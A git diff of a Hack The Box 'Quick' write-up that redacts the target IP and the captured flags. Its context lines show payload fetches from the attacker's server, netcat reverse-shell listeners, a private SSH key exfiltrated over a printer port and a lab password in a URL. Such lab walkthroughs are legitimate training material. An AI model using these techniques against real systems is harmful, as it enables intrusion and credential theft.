@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Quick
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-quick-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
@@ -42,12 +40,12 @@ Short description to include any strange things to be dealt with
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.186`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kalimaa:~$ nmap -p- -sC -sV -oN quick.nmap 10.10.10.186
+zweilos@kalimaa:~$ nmap -p- -sC -sV -oN quick.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 14:35 EDT
-Nmap scan report for 10.10.10.186
+Nmap scan report for <YOUR_IP>
 Host is up (0.055s latency).
 Not shown: 65533 closed ports
 PORT     STATE SERVICE VERSION
@@ -91,7 +89,7 @@ My shortlist of potential usernames had four entries on it.
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-login.png)
 
-Clicking on the "Get Started" link led to a login page at [http://10.10.10.186:9001/login.php](http://10.10.10.186:9001/login.php). I attempted to see if any of these names would give me a positive error indicating a valid username, but the form required email addresses rather than usernames so it yielded nothing.
+Clicking on the "Get Started" link led to a login page at [http://<YOUR_IP>:9001/login.php](http://<YOUR_IP>:9001/login.php). I attempted to see if any of these names would give me a positive error indicating a valid username, but the form required email addresses rather than usernames so it yielded nothing.
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-dirbuster-quick%2520%25281%2529.png)
 
@@ -118,10 +116,10 @@ I recommend not scanning all 65536 ports at a time if you ever need to scan UDP,
 {% endhint %}
 
 ```text
-root@kali:/home/zweilos/htb/quick# nmap --reason -sU -Pn -A -p1-1000 -oN quick.nmap-udp 10.10.10.186
+root@kali:/home/zweilos/htb/quick# nmap --reason -sU -Pn -A -p1-1000 -oN quick.nmap-udp <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 18:51 EDT
 
-Nmap scan report for quick.htb (10.10.10.186)
+Nmap scan report for quick.htb (<YOUR_IP>)
 Host is up, received user-set (0.052s latency).
 Scanned at 2020-08-10 18:51:59 EDT for 1348s
 Not shown: 999 closed ports
@@ -143,7 +141,7 @@ Network Distance: 2 hops
 TRACEROUTE (using port 979/udp)
 HOP RTT      ADDRESS
 1   76.04 ms 10.10.14.1
-2   76.30 ms quick.htb (10.10.10.186)
+2   76.30 ms quick.htb (<YOUR_IP>)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1348.02 seconds
@@ -436,7 +434,7 @@ Since I now had access to some fields that I could send input through, I decided
 ```text
 zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
 Serving HTTP on 0.0.0.0 port 9088 ...
-10.10.10.186 - - [11/Aug/2020 21:15:36] "GET /evil.xsl HTTP/1.1" 200 -
+<YOUR_IP> - - [11/Aug/2020 21:15:36] "GET /evil.xsl HTTP/1.1" 200 -
 ```
 
 I followed the instructions in the blog and crafted an XSL file, which contained specially formed XML code that would be read and executed by Esigate when reflected into an XML file.
@@ -472,22 +470,22 @@ After some testing I found that the vulnerability indeed existed in the ticket s
 ```text
 zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
 Serving HTTP on 0.0.0.0 port 9088 ...
-10.10.10.186 - - [11/Aug/2020 21:35:46] code 404, message File not found
-10.10.10.186 - - [11/Aug/2020 21:35:46] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
-10.10.10.186 - - [11/Aug/2020 21:47:27] code 404, message File not found
-10.10.10.186 - - [11/Aug/2020 21:47:27] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
-10.10.10.186 - - [11/Aug/2020 21:47:41] code 404, message File not found
-10.10.10.186 - - [11/Aug/2020 21:47:41] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
-10.10.10.186 - - [11/Aug/2020 21:47:47] code 404, message File not found
-10.10.10.186 - - [11/Aug/2020 21:47:47] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
-10.10.10.186 - - [11/Aug/2020 21:53:58] code 404, message File not found
-10.10.10.186 - - [11/Aug/2020 21:53:58] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
-10.10.10.186 - - [11/Aug/2020 21:59:59] "GET /test.xsl HTTP/1.1" 200 -
-10.10.10.186 - - [11/Aug/2020 21:59:59] "GET /test.xml HTTP/1.1" 200 -
-10.10.10.186 - - [11/Aug/2020 22:03:31] code 404, message File not found
-10.10.10.186 - - [11/Aug/2020 22:03:31] "GET http://10.10.15.57:9088/test.xsl HTTP/1.1" 404 -
-10.10.10.186 - - [11/Aug/2020 22:06:43] "GET /test1.xsl HTTP/1.1" 200 -
-10.10.10.186 - - [11/Aug/2020 22:06:44] "GET /test1.xml HTTP/1.1" 200 -
+<YOUR_IP> - - [11/Aug/2020 21:35:46] code 404, message File not found
+<YOUR_IP> - - [11/Aug/2020 21:35:46] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
+<YOUR_IP> - - [11/Aug/2020 21:47:27] code 404, message File not found
+<YOUR_IP> - - [11/Aug/2020 21:47:27] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
+<YOUR_IP> - - [11/Aug/2020 21:47:41] code 404, message File not found
+<YOUR_IP> - - [11/Aug/2020 21:47:41] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
+<YOUR_IP> - - [11/Aug/2020 21:47:47] code 404, message File not found
+<YOUR_IP> - - [11/Aug/2020 21:47:47] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
+<YOUR_IP> - - [11/Aug/2020 21:53:58] code 404, message File not found
+<YOUR_IP> - - [11/Aug/2020 21:53:58] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
+<YOUR_IP> - - [11/Aug/2020 21:59:59] "GET /test.xsl HTTP/1.1" 200 -
+<YOUR_IP> - - [11/Aug/2020 21:59:59] "GET /test.xml HTTP/1.1" 200 -
+<YOUR_IP> - - [11/Aug/2020 22:03:31] code 404, message File not found
+<YOUR_IP> - - [11/Aug/2020 22:03:31] "GET http://10.10.15.57:9088/test.xsl HTTP/1.1" 404 -
+<YOUR_IP> - - [11/Aug/2020 22:06:43] "GET /test1.xsl HTTP/1.1" 200 -
+<YOUR_IP> - - [11/Aug/2020 22:06:44] "GET /test1.xml HTTP/1.1" 200 -
 ```
 
 After quite a bit of head-scratching and testing, I found that I could only use a specific filename once. After that it caused a 404 error for even files that definitely exist on my locally hosted python server. I wasn't sure what was going on but it must have been something the server was doing.
@@ -495,7 +493,7 @@ After quite a bit of head-scratching and testing, I found that I could only use 
 ```text
 zweilos@kali:~/htb/quick$ nc -lvnp 13371 > passwd
 listening on [any] 13371 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 43030
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 43030
 ```
 
 During some of my testing, I tried to get the server to send me `/etc/passwd`, but unfortunately the file was blank. After testing it again a different way, I concluded that this command was being blocked so nothing was being sent.  The important thing was that I could see that my test exploit worked.
@@ -630,13 +628,13 @@ Everything looked like it completed without errors...
 ```text
 zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
 Serving HTTP on 0.0.0.0 port 9088 ...
-10.10.10.186 - - [15/Aug/2020 12:24:41] "GET /evil.xsl HTTP/1.1" 200 -
-10.10.10.186 - - [15/Aug/2020 12:24:42] "GET /evil.xml HTTP/1.1" 200 -
-10.10.10.186 - - [15/Aug/2020 12:24:42] "GET /nc HTTP/1.1" 200 -
-10.10.10.186 - - [15/Aug/2020 12:24:45] "GET /evil1.xsl HTTP/1.1" 200 -
-10.10.10.186 - - [15/Aug/2020 12:24:45] "GET /evil1.xml HTTP/1.1" 200 -
-10.10.10.186 - - [15/Aug/2020 12:24:47] "GET /evil2.xsl HTTP/1.1" 200 -
-10.10.10.186 - - [15/Aug/2020 12:24:47] "GET /evil2.xml HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Aug/2020 12:24:41] "GET /evil.xsl HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Aug/2020 12:24:42] "GET /evil.xml HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Aug/2020 12:24:42] "GET /nc HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Aug/2020 12:24:45] "GET /evil1.xsl HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Aug/2020 12:24:45] "GET /evil1.xml HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Aug/2020 12:24:47] "GET /evil2.xsl HTTP/1.1" 200 -
+<YOUR_IP> - - [15/Aug/2020 12:24:47] "GET /evil2.xml HTTP/1.1" 200 -
 ```
 
 All of my files were uploaded successfully...
@@ -644,7 +642,7 @@ All of my files were uploaded successfully...
 ```text
 zweilos@kalimaa:~/htb/quick$ nc -lvnp 13371
 listening on [any] 13371 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 39638
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 39638
 whoami && hostname
 sam
 quick
@@ -667,7 +665,7 @@ The first thing to do after gaining access was to claim my proof.
 
 ```text
 sam@quick:~$ cat user.txt 
-b57f59cafe91c035dc504c4d8158bd59
+****
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -693,7 +691,6 @@ drwxr-xr-x 5 sam sam    4096 Mar 20 03:01 ..
 -rw-r--r-- 1 sam sam 6700842 Oct 11  2017 esigate-server.jar
 -rw-r--r-- 1 sam sam 3000503 Oct 11  2017 esigate-war.war
 drwxrwxr-x 3 sam sam    4096 Aug 15 15:33 work
-
 
 sam@quick:~/esigate-distribution-5.2$ ls -la lib/
 total 2792
@@ -1098,7 +1095,7 @@ sam@quick:~/.ssh$echo 'ssh-rsa AAAA<my_public_key> zweilos@kali' >> authorized_k
 SSH worked, after that it I set up my port redirection tunnel. The `-L` option allows you to forward a local port to a port on the remote machine with the syntax: `-L local_socket:host:hostport`.
 
 ```text
-zweilos@kali:~/htb/quick$ ssh -L 40905:10.10.10.186:80 sam@quick.htb
+zweilos@kali:~/htb/quick$ ssh -L 40905:<YOUR_IP>:80 sam@quick.htb
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -1108,11 +1105,10 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
   System information as of Sun Aug 16 18:31:26 UTC 2020
 
   System load:  0.06               Users logged in:                1
-  Usage of /:   30.1% of 19.56GB   IP address for ens33:           10.10.10.186
+  Usage of /:   30.1% of 19.56GB   IP address for ens33:           <YOUR_IP>
   Memory usage: 23%                IP address for br-9ef1bb2e82cd: 172.18.0.1
   Swap usage:   0%                 IP address for docker0:         172.17.0.1
   Processes:    130
-
 
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
@@ -1123,12 +1119,11 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
-
 Last login: Sun Aug 16 18:30:27 2020 from 10.10.15.57
 sam@quick:~$
 ```
 
-I logged in successfully, now to test my port forwarding in the browser. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/connection-reset.png) Unfortunately it didn't work, though I quickly spotted the problem. I was trying to connect to 10.10.10.186 on port 80, just from the `quick.htb` machine, which I already knew was blocked. I needed to access the site the same way I had with curl earlier, with `127.0.0.1:80`.
+I logged in successfully, now to test my port forwarding in the browser. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/connection-reset.png) Unfortunately it didn't work, though I quickly spotted the problem. I was trying to connect to <YOUR_IP> on port 80, just from the `quick.htb` machine, which I already knew was blocked. I needed to access the site the same way I had with curl earlier, with `127.0.0.1:80`.
 
 ```text
 zweilos@kali:~/htb/quick$ ssh -L 40905:127.0.0.1:80 sam@quick.htb
@@ -1151,10 +1146,10 @@ This led me to a login page. Since I knew that the page was running as `srvadm`,
 ```text
 zweilos@kali:~/htb/quick$ nc -lvnp 9100
 listening on [any] 9100 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 33998
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 33998
 zweilos@kali:~/htb/quick$ nc -lvnp 9100
 listening on [any] 9100 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 34158
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 34158
 This is a testVA
 ```
 
@@ -1227,7 +1222,7 @@ This time, instead of trying to put the contents of the SSH key in the print fil
 ```text
 zweilos@kali:~/htb/quick$ nc -lvnp 9100
 listening on [any] 9100 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 36404
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 36404
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
 AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
@@ -1289,11 +1284,10 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
   System information as of Sun Aug 16 22:28:26 UTC 2020
 
   System load:  0.0                Users logged in:                1
-  Usage of /:   30.1% of 19.56GB   IP address for ens33:           10.10.10.186
+  Usage of /:   30.1% of 19.56GB   IP address for ens33:           <YOUR_IP>
   Memory usage: 23%                IP address for br-9ef1bb2e82cd: 172.18.0.1
   Swap usage:   0%                 IP address for docker0:         172.17.0.1
   Processes:    134
-
 
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
@@ -1303,7 +1297,6 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 28 updates are security updates.
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Sun Aug 16 11:56:50 2020 from 10.10.14.110
 srvadm@quick:~$ sudo -l
@@ -1391,7 +1384,7 @@ curl: (6) Could not resolve host: printerv3.quick.htb
 
 ```text
 first tunnel
-zweilos@kalimaa:~/htb/quick$ ssh -L 40905:10.10.10.186:443 -i srvadm.id_rsa srvadm@quick.htb
+zweilos@kalimaa:~/htb/quick$ ssh -L 40905:<YOUR_IP>:443 -i srvadm.id_rsa srvadm@quick.htb
 then
 https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
 decodes to 
@@ -1410,9 +1403,5 @@ root@quick:~# whoami && uname -a
 root
 Linux quick 4.15.0-91-generic #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 root@quick:~# cat root.txt 
-d5d1c123d8fd11db776d25ddb3e8256a
+****
 ```
-
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
